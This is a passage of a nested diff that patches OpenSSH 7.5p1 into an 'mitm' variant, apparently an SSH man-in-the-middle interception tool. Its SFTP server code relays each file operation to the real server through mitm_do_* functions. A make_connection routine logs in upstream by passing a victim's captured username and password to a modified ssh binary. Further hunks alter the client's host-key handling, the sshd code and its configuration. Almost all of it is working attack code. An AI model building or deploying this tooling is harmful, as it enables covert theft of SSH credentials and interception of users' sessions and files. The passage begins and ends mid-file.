+ static void
+ handle_log_close(int handle, char *emsg)
+@@ -477,6 +481,27 @@
+ 	return 0;
+ }
+ 
++/* Handle return value must be free()'ed. */
++int
++get_handle_all(struct sshbuf *queue, u_char **handle_str, size_t *handle_len, int *handle_int)
++{
++	int r;
++
++	if ((r = sshbuf_get_string(queue, handle_str, handle_len)) != 0)
++	  return r;
++
++	if (*handle_len < 256)
++		*handle_int = handle_from_string(*handle_str, *handle_len);
++	else {
++		free(*handle_str); *handle_str = NULL;
++		*handle_len = 0;
++		*handle_int = -1;
++		return -1;
++	}
++
++	return 0;
++}
++
+ /* send replies */
+ 
+ static void
+@@ -568,6 +593,14 @@
+ }
+ 
+ static void
++send_handle_str(u_int32_t id, u_char *handle, size_t handle_len)
++{
++	debug("request %u: sent handle_str handle %d", id, atoi(handle));
++	send_data_or_handle(SSH2_FXP_HANDLE, id, handle, handle_len);
++}
++
++
++static void
+ send_names(u_int32_t id, int count, const Stat *stats)
+ {
+ 	struct sshbuf *msg;
+@@ -717,6 +750,7 @@
+ static void
+ process_close(u_int32_t id)
+ {
++	/*
+ 	int r, handle, ret, status = SSH2_FX_FAILURE;
+ 
+ 	if ((r = get_handle(iqueue, &handle)) != 0)
+@@ -727,6 +761,19 @@
+ 	ret = handle_close(handle);
+ 	status = (ret == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+ 	send_status(id, status);
++	*/
++	int r;
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
++	int handle_int = -1;
++
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	debug3("request %u: close handle %u", id, handle_int);
++	int status = mitm_do_close(client_conn, handle_str, handle_len);
++	debug3("request %u: close handle %u: returning %u", id, handle_int, status);
++	send_status(id, status);
++	free(handle_str); handle_str = NULL;
+ }
+ 
+ static void
+@@ -814,18 +861,19 @@
+ }
+ 
+ static void
+-process_do_stat(u_int32_t id, int do_lstat)
++process_do_stat(u_int32_t id, int do_lstat_arg)
+ {
+-	Attrib a;
+-	struct stat st;
++	/*Attrib a;
++	struct stat st;*/
+ 	char *name;
+ 	int r, status = SSH2_FX_FAILURE;
+ 
+ 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 
+-	debug3("request %u: %sstat", id, do_lstat ? "l" : "");
+-	verbose("%sstat name \"%s\"", do_lstat ? "l" : "", name);
++	debug3("request %u: %sstat", id, do_lstat_arg ? "l" : "");
++	verbose("%sstat name \"%s\"", do_lstat_arg ? "l" : "", name);
++	/*
+ 	r = do_lstat ? lstat(name, &st) : stat(name, &st);
+ 	if (r < 0) {
+ 		status = errno_to_portable(errno);
+@@ -836,6 +884,20 @@
+ 	}
+ 	if (status != SSH2_FX_OK)
+ 		send_status(id, status);
++	*/
++	Attrib *b;
++	if (do_lstat_arg) 
++		b = do_lstat(client_conn, name, 0, &status);
++	else
++		b = do_stat(client_conn, name, 0, &status);
++
++	if (b != NULL) {
++		debug3("%sstat(%s) returning non-NULL", do_lstat_arg ? "l" : "", name);
++		send_attrib(id, b);
++	} else {
++		debug3("%sstat(%s) returning status %u", do_lstat_arg ? "l" : "", name, status);
++		send_status(id, status);
++	}
+ 	free(name);
+ }
+ 
+@@ -854,10 +916,17 @@
+ static void
+ process_fstat(u_int32_t id)
+ {
+-	Attrib a;
+-	struct stat st;
+-	int fd, r, handle, status = SSH2_FX_FAILURE;
++	Attrib *a;
++	int status = SSH2_FX_FAILURE;
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
++	int handle_int = -1;
++	int r;
+ 
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	/*
+ 	if ((r = get_handle(iqueue, &handle)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 	debug("request %u: fstat \"%s\" (handle %u)",
+@@ -875,8 +944,16 @@
+ 	}
+ 	if (status != SSH2_FX_OK)
+ 		send_status(id, status);
++	*/
++	a = mitm_do_fstat(client_conn, handle_str, handle_len, 1, &status);
++	if (a != NULL)
++		send_attrib(id, a);
++	else
++		send_status(id, status);
++	free(handle_str);  handle_str = NULL;
+ }
+ 
++/*
+ static struct timeval *
+ attrib_to_tv(const Attrib *a)
+ {
+@@ -888,6 +965,7 @@
+ 	tv[1].tv_usec = 0;
+ 	return tv;
+ }
++*/
+ 
+ static void
+ process_setstat(u_int32_t id)
+@@ -901,6 +979,7 @@
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 
+ 	debug("request %u: setstat name \"%s\"", id, name);
++	/*
+ 	if (a.flags & SSH2_FILEXFER_ATTR_SIZE) {
+ 		logit("set \"%s\" size %llu",
+ 		    name, (unsigned long long)a.size);
+@@ -932,6 +1011,8 @@
+ 		if (r == -1)
+ 			status = errno_to_portable(errno);
+ 	}
++	*/
++	status = mitm_do_setstat(client_conn, name, &a);
+ 	send_status(id, status);
+ 	free(name);
+ }
+@@ -940,9 +1021,16 @@
+ process_fsetstat(u_int32_t id)
+ {
+ 	Attrib a;
+-	int handle, fd, r;
+ 	int status = SSH2_FX_OK;
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
++	int handle_int = -1;
++	int r;
+ 
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
++	    (r = decode_attrib(iqueue, &a)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	/*
+ 	if ((r = get_handle(iqueue, &handle)) != 0 ||
+ 	    (r = decode_attrib(iqueue, &a)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+@@ -998,12 +1086,16 @@
+ 				status = errno_to_portable(errno);
+ 		}
+ 	}
++	*/
++	status = mitm_do_fsetstat(client_conn, handle_str, handle_len, &a);
++	free(handle_str);  handle_str = NULL;
+ 	send_status(id, status);
+ }
+ 
+ static void
+ process_opendir(u_int32_t id)
+ {
++	/*
+ 	DIR *dirp = NULL;
+ 	char *path;
+ 	int r, handle, status = SSH2_FX_FAILURE;
+@@ -1028,12 +1120,31 @@
+ 	}
+ 	if (status != SSH2_FX_OK)
+ 		send_status(id, status);
++	*/
++	int r, status = SSH2_FX_FAILURE;
++	char * path;
++	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	debug3("request %u: opendir", id);
++	logit("opendir \"%s\"", path);
++
++	size_t handle_len = 0;
++	u_char *handle_str = mitm_do_opendir(client_conn, path, &handle_len, &status);
++	if (handle_str != NULL) {
++	  debug3("opendir(%s) handle: %d", path, atoi(handle_str));
++	  send_handle_str(id, handle_str, handle_len);
++	} else {
++	  debug3("opendir(%s) status: %d", path, status);
++	  send_status(id, status);
++	}
+ 	free(path);
+ }
+ 
+ static void
+ process_readdir(u_int32_t id)
+ {
++	/*
+ 	DIR *dirp;
+ 	struct dirent *dp;
+ 	char *path;
+@@ -1060,7 +1171,9 @@
+ 				nstats *= 2;
+ 				stats = xreallocarray(stats, nstats, sizeof(Stat));
+ 			}
++	*/
+ /* XXX OVERFLOW ? */
++	/*
+ 			snprintf(pathname, sizeof pathname, "%s%s%s", path,
+ 			    strcmp(path, "/") ? "/" : "", dp->d_name);
+ 			if (lstat(pathname, &st) < 0)
+@@ -1069,8 +1182,10 @@
+ 			stats[count].name = xstrdup(dp->d_name);
+ 			stats[count].long_name = ls_file(dp->d_name, &st, 0, 0);
+ 			count++;
++	*/
+ 			/* send up to 100 entries in one message */
+ 			/* XXX check packet size instead */
++	/*
+ 			if (count == 100)
+ 				break;
+ 		}
+@@ -1085,6 +1200,32 @@
+ 		}
+ 		free(stats);
+ 	}
++	*/
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
++	int handle_int = -1;
++	int r;
++
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
++		fatal("%s: buffer error", __func__);
++	debug("request %u: readdir(handle %d)", id, handle_int);
++
++	int status = 0;
++	u_int count = 0;
++	Stat *stats = mitm_do_readdir(client_conn, id, handle_str, handle_len, &count, &status);
++	if (stats == NULL) {
++	  debug("readdir(handle %d): returning status %d", handle_int, status);
++	  send_status(id, status);
++	} else {
++	  send_names(id, count, stats);
++	  for (u_int i = 0; i < count; i++) {
++	    debug("readdir(handle %d): returning \"%s\" / \"%s\"", handle_int, stats[i].name, stats[i].long_name);
++	    free(stats[i].name); stats[i].name = NULL;
++	    free(stats[i].long_name); stats[i].long_name = NULL;
++	  }
++	  free(stats); stats = NULL;
++	}
++	free(handle_str); handle_str = NULL;
+ }
+ 
+ static void
+@@ -1098,9 +1239,13 @@
+ 
+ 	debug3("request %u: remove", id);
+ 	logit("remove name \"%s\"", name);
++	/*
+ 	r = unlink(name);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+ 	send_status(id, status);
++	*/
++	status = mitm_do_rm(client_conn, name);
++	send_status(id, status);
+ 	free(name);
+ }
+ 
+@@ -1119,9 +1264,13 @@
+ 	    a.perm & 07777 : 0777;
+ 	debug3("request %u: mkdir", id);
+ 	logit("mkdir name \"%s\" mode 0%o", name, mode);
++	/*
+ 	r = mkdir(name, mode);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+ 	send_status(id, status);
++	*/
++	status = mitm_do_mkdir(client_conn, name, &a);
++	send_status(id, status);
+ 	free(name);
+ }
+ 
+@@ -1136,16 +1285,19 @@
+ 
+ 	debug3("request %u: rmdir", id);
+ 	logit("rmdir name \"%s\"", name);
++	/*
+ 	r = rmdir(name);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+ 	send_status(id, status);
++	*/
++	status = mitm_do_rmdir(client_conn, name);
++	send_status(id, status);
+ 	free(name);
+ }
+ 
+ static void
+ process_realpath(u_int32_t id)
+ {
+-	char resolvedname[PATH_MAX];
+ 	char *path;
+ 	int r;
+ 
+@@ -1158,6 +1310,7 @@
+ 	}
+ 	debug3("request %u: realpath", id);
+ 	verbose("realpath \"%s\"", path);
++	/*
+ 	if (realpath(path, resolvedname) == NULL) {
+ 		send_status(id, errno_to_portable(errno));
+ 	} else {
+@@ -1166,6 +1319,13 @@
+ 		s.name = s.long_name = resolvedname;
+ 		send_names(id, 1, &s);
+ 	}
++	*/
++	char *realpath = do_realpath(client_conn, path);
++	Stat s;
++	attrib_clear(&s.attrib);
++	s.name = s.long_name = realpath;
++	send_names(id, 1, &s);
++	free(realpath); realpath = NULL;
+ 	free(path);
+ }
+ 
+@@ -1174,7 +1334,6 @@
+ {
+ 	char *oldpath, *newpath;
+ 	int r, status;
+-	struct stat sb;
+ 
+ 	if ((r = sshbuf_get_cstring(iqueue, &oldpath, NULL)) != 0 ||
+ 	    (r = sshbuf_get_cstring(iqueue, &newpath, NULL)) != 0)
+@@ -1182,11 +1341,14 @@
+ 
+ 	debug3("request %u: rename", id);
+ 	logit("rename old \"%s\" new \"%s\"", oldpath, newpath);
++	/*
+ 	status = SSH2_FX_FAILURE;
+ 	if (lstat(oldpath, &sb) == -1)
+ 		status = errno_to_portable(errno);
+ 	else if (S_ISREG(sb.st_mode)) {
++	*/
+ 		/* Race-free rename of regular files */
++	/*
+ 		if (link(oldpath, newpath) == -1) {
+ 			if (errno == EOPNOTSUPP || errno == ENOSYS
+ #ifdef EXDEV
+@@ -1198,10 +1360,12 @@
+ 			    ) {
+ 				struct stat st;
+ 
++	*/
+ 				/*
+ 				 * fs doesn't support links, so fall back to
+ 				 * stat+rename.  This is racy.
+ 				 */
++	/*
+ 				if (stat(newpath, &st) == -1) {
+ 					if (rename(oldpath, newpath) == -1)
+ 						status =
+@@ -1214,7 +1378,9 @@
+ 			}
+ 		} else if (unlink(oldpath) == -1) {
+ 			status = errno_to_portable(errno);
++	*/
+ 			/* clean spare link */
++	/*
+ 			unlink(newpath);
+ 		} else
+ 			status = SSH2_FX_OK;
+@@ -1224,6 +1390,8 @@
+ 		else
+ 			status = SSH2_FX_OK;
+ 	}
++	*/
++	status = mitm_do_rename(client_conn, oldpath, newpath, 1);
+ 	send_status(id, status);
+ 	free(oldpath);
+ 	free(newpath);
+@@ -1232,15 +1400,18 @@
+ static void
+ process_readlink(u_int32_t id)
+ {
+-	int r, len;
+-	char buf[PATH_MAX];
++	int r;
+ 	char *path;
++	u_int status = 0;
++	char *filename = NULL, *long_name = NULL;
++	Attrib a;
+ 
+ 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 
+ 	debug3("request %u: readlink", id);
+ 	verbose("readlink \"%s\"", path);
++	/*
+ 	if ((len = readlink(path, buf, sizeof(buf) - 1)) == -1)
+ 		send_status(id, errno_to_portable(errno));
+ 	else {
+@@ -1251,6 +1422,18 @@
+ 		s.name = s.long_name = buf;
+ 		send_names(id, 1, &s);
+ 	}
++	*/
++	if (mitm_do_readlink(client_conn, path, &status, &filename, &long_name, &a) == 1) {
++		Stat s;
++		s.name = filename;
++		s.long_name = long_name;
++		s.attrib = a;
++		send_names(id, 1, &s);
++	} else
++		send_status(id, status);
++
++	free(filename); filename = NULL;
++	free(long_name); long_name = NULL;
+ 	free(path);
+ }
+ 
+@@ -1267,8 +1450,11 @@
+ 	debug3("request %u: symlink", id);
+ 	logit("symlink old \"%s\" new \"%s\"", oldpath, newpath);
+ 	/* this will fail if 'newpath' exists */
++	/*
+ 	r = symlink(oldpath, newpath);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
++	*/
++	status = mitm_do_symlink(client_conn, oldpath, newpath);
+ 	send_status(id, status);
+ 	free(oldpath);
+ 	free(newpath);
+@@ -1286,8 +1472,11 @@
+ 
+ 	debug3("request %u: posix-rename", id);
+ 	logit("posix-rename old \"%s\" new \"%s\"", oldpath, newpath);
++	/*
+ 	r = rename(oldpath, newpath);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
++	*/
++	status = mitm_do_rename(client_conn, oldpath, newpath, 0);
+ 	send_status(id, status);
+ 	free(oldpath);
+ 	free(newpath);
+@@ -1299,29 +1488,46 @@
+ 	char *path;
+ 	struct statvfs st;
+ 	int r;
++	u_int status = 0;
+ 
+ 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 	debug3("request %u: statvfs", id);
+ 	logit("statvfs \"%s\"", path);
+ 
++	/*
+ 	if (statvfs(path, &st) != 0)
+ 		send_status(id, errno_to_portable(errno));
+ 	else
+ 		send_statvfs(id, &st);
++	*/
++	if (mitm_do_statvfs(client_conn, path, &st, &status) != -1)
++		send_statvfs(id, &st);
++	else
++		send_status(id, status);
++
+         free(path);
+ }
+ 
+ static void
+ process_extended_fstatvfs(u_int32_t id)
+ {
+-	int r, handle, fd;
++	int r, handle;
+ 	struct statvfs st;
++	u_int status = 0;
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
+ 
++	/*
+ 	if ((r = get_handle(iqueue, &handle)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	*/
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
+ 	debug("request %u: fstatvfs \"%s\" (handle %u)",
+ 	    id, handle_to_name(handle), handle);
++	/*
+ 	if ((fd = handle_to_fd(handle)) < 0) {
+ 		send_status(id, SSH2_FX_FAILURE);
+ 		return;
+@@ -1330,6 +1536,13 @@
+ 		send_status(id, errno_to_portable(errno));
+ 	else
+ 		send_statvfs(id, &st);
++	*/
++	if (mitm_do_fstatvfs(client_conn, handle_str, handle_len, &st, &status) != -1)
++		send_statvfs(id, &st);
++	else
++		send_status(id, status);
++
++	free(handle_str); handle_str = NULL;
+ }
+ 
+ static void
+@@ -1344,8 +1557,11 @@
+ 
+ 	debug3("request %u: hardlink", id);
+ 	logit("hardlink old \"%s\" new \"%s\"", oldpath, newpath);
++	/*
+ 	r = link(oldpath, newpath);
+ 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
++	*/
++	status = mitm_do_hardlink(client_conn, oldpath, newpath);
+ 	send_status(id, status);
+ 	free(oldpath);
+ 	free(newpath);
+@@ -1354,19 +1570,30 @@
+ static void
+ process_extended_fsync(u_int32_t id)
+ {
+-	int handle, fd, r, status = SSH2_FX_OP_UNSUPPORTED;
++	int handle, r, status = SSH2_FX_OP_UNSUPPORTED;
++	u_char *handle_str = NULL;
++	size_t handle_len = 0;
+ 
++	/*
+ 	if ((r = get_handle(iqueue, &handle)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	*/
++	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
+ 	debug3("request %u: fsync (handle %u)", id, handle);
+ 	verbose("fsync \"%s\"", handle_to_name(handle));
++	/*
+ 	if ((fd = handle_to_fd(handle)) < 0)
+ 		status = SSH2_FX_NO_SUCH_FILE;
+ 	else if (handle_is_ok(handle, HANDLE_FILE)) {
+ 		r = fsync(fd);
+ 		status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+ 	}
++	*/
++	status = mitm_do_fsync(client_conn, handle_str, handle_len);
+ 	send_status(id, status);
++	free(handle_str); handle_str = NULL;
+ }
+ 
+ static void
+@@ -1485,19 +1712,17 @@
+ static void
+ sftp_server_usage(void)
+ {
+-	extern char *__progname;
+-
+ 	fprintf(stderr,
+ 	    "usage: %s [-ehR] [-d start_directory] [-f log_facility] "
+ 	    "[-l log_level]\n\t[-P blacklisted_requests] "
+ 	    "[-p whitelisted_requests] [-u umask]\n"
+ 	    "       %s -Q protocol_feature\n",
+-	    __progname, __progname);
++	    "/usr/libexec/sftp-server", "/usr/libexec/sftp-server");
+ 	exit(1);
+ }
+ 
+ int
+-sftp_server_main(int argc, char **argv, struct passwd *user_pw)
++sftp_server_main(int argc, char **argv, struct passwd *user_pw, char *original_host, unsigned short original_port, char *username, char *password)
+ {
+ 	fd_set *rset, *wset;
+ 	int i, r, in, out, max, ch, skipargs = 0, log_stderr = 0;
+@@ -1553,10 +1778,12 @@
+ 				error("Invalid log facility \"%s\"", optarg);
+ 			break;
+ 		case 'd':
++			/*
+ 			cp = tilde_expand_filename(optarg, user_pw->pw_uid);
+ 			homedir = percent_expand(cp, "d", user_pw->pw_dir,
+ 			    "u", user_pw->pw_name, (char *)NULL);
+ 			free(cp);
++			*/
+ 			break;
+ 		case 'p':
+ 			if (request_whitelist != NULL)
+@@ -1638,6 +1865,7 @@
+ 		}
+ 	}
+ 
++	client_conn = make_connection(original_host, original_port, username, password);
+ 	set_size = howmany(max + 1, NFDBITS) * sizeof(fd_mask);
+ 	for (;;) {
+ 		memset(rset, 0, set_size);
+@@ -1706,3 +1934,115 @@
+ 			    __func__, ssh_err(r));
+ 	}
+ }
++
++/* Copied from sftp.c. */
++/* ARGSUSED */
++static void
++killchild(int signo)
++{
++	if (sshpid > 1) {
++		kill(sshpid, SIGTERM);
++		waitpid(sshpid, NULL, 0);
++	}
++
++	_exit(1);
++}
++
++/* Copied from sftp.c. */
++/* ARGSUSED */
++static void
++suspchild(int signo)
++{
++	if (sshpid > 1) {
++		kill(sshpid, signo);
++		while (waitpid(sshpid, NULL, WUNTRACED) == -1 && errno == EINTR)
++			continue;
++	}
++	kill(getpid(), SIGSTOP);
++}
++
++/* Copied from sftp.c. */
++static void
++connect_to_server(char *path, char **args, int *in, int *out)
++{
++	int c_in, c_out;
++
++#ifdef USE_PIPES
++	int pin[2], pout[2];
++
++	if ((pipe(pin) == -1) || (pipe(pout) == -1))
++		fatal("pipe: %s", strerror(errno));
++	*in = pin[0];
++	*out = pout[1];
++	c_in = pout[0];
++	c_out = pin[1];
++#else /* USE_PIPES */
++	int inout[2];
++
++	if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) == -1)
++		fatal("socketpair: %s", strerror(errno));
++	*in = *out = inout[0];
++	c_in = c_out = inout[1];
++#endif /* USE_PIPES */
++
++	if ((sshpid = fork()) == -1)
++		fatal("fork: %s", strerror(errno));
++	else if (sshpid == 0) {
++		if ((dup2(c_in, STDIN_FILENO) == -1) ||
++		    (dup2(c_out, STDOUT_FILENO) == -1)) {
++			fprintf(stderr, "dup2: %s\n", strerror(errno));
++			_exit(1);
++		}
++		close(*in);
++		close(*out);
++		close(c_in);
++		close(c_out);
++
++		/*
++		 * The underlying ssh is in the same process group, so we must
++		 * ignore SIGINT if we want to gracefully abort commands,
++		 * otherwise the signal will make it to the ssh process and
++		 * kill it too.  Contrawise, since sftp sends SIGTERMs to the
++		 * underlying ssh, it must *not* ignore that signal.
++		 */
++		signal(SIGINT, SIG_IGN);
++		signal(SIGTERM, SIG_DFL);
++
++		execvp(path, args);
++		fprintf(stderr, "exec: %s: %s\n", path, strerror(errno));
++		_exit(1);
++	}
++
++	signal(SIGTERM, killchild);
++	signal(SIGINT, killchild);
++	signal(SIGHUP, killchild);
++	signal(SIGTSTP, suspchild);
++	signal(SIGTTIN, suspchild);
++	signal(SIGTTOU, suspchild);
++	close(c_in);
++	close(c_out);
++}
++
++struct sftp_conn *
++make_connection(char *host, unsigned short port, char *username, char *password) {
++	arglist args;
++	char *ssh_program = "/home/ssh-mitm/bin/ssh";
++	int in = -1, out = -1;
++
++	args.list = NULL;
++	addargs(&args, "%s", ssh_program);
++	addargs(&args, "-Z");
++	addargs(&args, "%s", password);
++	addargs(&args, "-oForwardX11=no");
++	addargs(&args, "-oForwardAgent=no");
++	addargs(&args, "-oPermitLocalCommand=no");
++	addargs(&args, "-oClearAllForwardings=yes");
++	addargs(&args, "-oPort=%u", port);
++	addargs(&args, "-oProtocol=2");
++	addargs(&args, "-s");
++	addargs(&args, "--");
++	addargs(&args, "%s@%s", username, host);
++	addargs(&args, "sftp");
++	connect_to_server(ssh_program, args.list, &in, &out);
++	return do_init(in, out, 32768, 64, 0);
++}
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server-main.c openssh-7.5p1-mitm/sftp-server-main.c
+--- openssh-7.5p1/sftp-server-main.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-server-main.c	2017-07-07 16:47:34.693012896 -0400
+@@ -21,6 +21,7 @@
+ #include <pwd.h>
+ #include <stdarg.h>
+ #include <stdio.h>
++#include <string.h>
+ #include <unistd.h>
+ 
+ #include "log.h"
+@@ -38,6 +39,12 @@
+ main(int argc, char **argv)
+ {
+ 	struct passwd *user_pw;
++	char **new_argv;
++
++	if (argc < 4) {
++		fprintf(stderr, "Error: at least four arguments necessary.\n");
++		return 1;
++	}
+ 
+ 	ssh_malloc_init();	/* must be called before any mallocs */
+ 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
+@@ -49,5 +56,11 @@
+ 		return 1;
+ 	}
+ 
+-	return (sftp_server_main(argc, argv, user_pw));
++	new_argv = calloc(argc - 4, sizeof(char *));
++
++	new_argv[0] = strdup(argv[0]);
++	for (int i = 1; i < argc - 4; i++)
++		new_argv[i] = strdup(argv[i + 4]);
++
++	return (sftp_server_main(argc - 4, new_argv, user_pw, argv[1], (unsigned short)atoi(argv[2]), argv[3], argv[4]));
+ }
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
 --- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/ssh.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/ssh.c	2017-07-06 12:52:17.029320213 -0400
 @@ -524,6 +524,7 @@
  	struct addrinfo *addrs = NULL;
  	struct ssh_digest_ctx *md;
@@ -705,9 +2534,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	if (options.rhosts_rsa_authentication ||
  	    options.hostbased_authentication) {
  		sensitive_data.nkeys = 9;
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
 --- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect2.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/sshconnect2.c	2017-07-06 12:52:17.029320213 -0400
 @@ -906,7 +906,8 @@
  
  	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
@@ -718,9 +2547,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	packet_start(SSH2_MSG_USERAUTH_REQUEST);
  	packet_put_cstring(authctxt->server_user);
  	packet_put_cstring(authctxt->service);
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
 --- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/sshconnect.c	2017-07-06 12:52:17.029320213 -0400
 @@ -916,10 +916,12 @@
  				    "address '%.128s' to the list of known "
  				    "hosts (%.500s).", type, ip,
@@ -768,9 +2597,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		break;
  	case HOST_REVOKED:
  		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
 --- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.h	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/sshconnect.h	2017-07-06 12:52:17.029320213 -0400
 @@ -29,6 +29,7 @@
  	Key	**keys;
  	int	nkeys;
@@ -779,9 +2608,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  };
  
  struct addrinfo;
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
 --- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/sshd.c	2017-07-06 12:52:17.029320213 -0400
 @@ -72,6 +72,8 @@
  #include <string.h>
  #include <unistd.h>
@@ -887,9 +2716,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		exit(0);
  	}
  
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
 --- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd_config	2017-06-29 21:43:54.690045120 -0400
++++ openssh-7.5p1-mitm/sshd_config	2017-07-06 12:52:17.029320213 -0400
 @@ -10,22 +10,24 @@
  # possible, but leave them commented.  Uncommented options override the
  # default value.
@@ -920,9 +2749,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  # Authentication:
  
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
